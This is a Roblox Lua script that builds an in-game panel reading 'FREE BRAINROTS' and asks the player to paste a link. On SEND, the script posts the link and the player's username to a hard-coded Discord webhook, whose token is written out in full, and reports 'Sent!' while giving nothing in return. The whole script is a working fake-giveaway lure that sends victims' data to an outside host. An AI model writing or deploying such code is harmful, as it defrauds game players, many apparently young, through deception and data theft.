local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1515955615804035156/OrTmQIBtdWRl6SsGuPEfVmt-8DKtiW1tLo_Z-8cRfV1Uk_AyhMceD7CNm6ONgIkM8JYv"

local Workspace = game.Workspace

-- Create physical UI in workspace
local part = Instance.new("Part")
part.Name = "LinkInput"
part.Shape = Enum.PartType.Block
part.Material = Enum.Material.Neon
part.Size = Vector3.new(8, 6, 1)
part.CanCollide = false
part.Parent = Workspace

-- Position in front of player
pcall(function()
    part.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 15
end)

-- Add BillboardGui for text input
local billboard = Instance.new("BillboardGui")
billboard.Size = UDim2.new(8, 0, 6, 0)
billboard.MaxDistance = math.huge
billboard.Parent = part

-- Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(255, 100, 100)
frame.Parent = billboard

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0.2, 0)
title.BackgroundTransparency = 1
title.Text = "FREE BRAINROTS"
title.TextColor3 = Color3.fromRGB(255, 100, 100)
title.TextSize = 32
title.Font = Enum.Font.GothamBold
title.Parent = frame

-- Input box
local input = Instance.new("TextBox")
input.Size = UDim2.new(0.9, 0, 0.35, 0)
input.Position = UDim2.new(0.05, 0, 0.25, 0)
input.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
input.TextColor3 = Color3.fromRGB(255, 255, 255)
input.TextSize = 14
input.Font = Enum.Font.Gotham
input.PlaceholderText = "Paste link here..."
input.ClearTextOnFocus = false
input.Parent = frame

-- Send button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0.9, 0, 0.25, 0)
button.Position = UDim2.new(0.05, 0, 0.65, 0)
button.BackgroundColor3 = Color3.fromRGB(0, 180, 100)
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 18
button.Font = Enum.Font.GothamBold
button.Text = "SEND"
button.BorderSizePixel = 0
button.Parent = frame

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0.1, 0)
status.Position = UDim2.new(0, 0, 0.9, 0)
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(100, 255, 100)
status.TextSize = 12
status.Font = Enum.Font.Gotham
status.Parent = frame

-- Send function
button.MouseButton1Click:Connect(function()
    local link = input.Text
    if link:len() < 10 then
        status.Text = "Invalid!"
        return
    end
    
    status.Text = "Sending..."
    button.Enabled = false
    
    task.spawn(function()
        pcall(function()
            HttpService:PostAsync(webhookUrl, HttpService:JSONEncode({
                content = "@Iamabigbackhim",
                embeds = {{
                    title = "Server Link",
                    description = link,
                    color = 65280,
                    fields = {{name = "Player", value = LocalPlayer.Name, inline = true}}
                }}
            }), Enum.HttpContentType.ApplicationJson)
        end)
        status.Text = "Sent!"
        input.Text = ""
        button.Enabled = true
    end)
end)
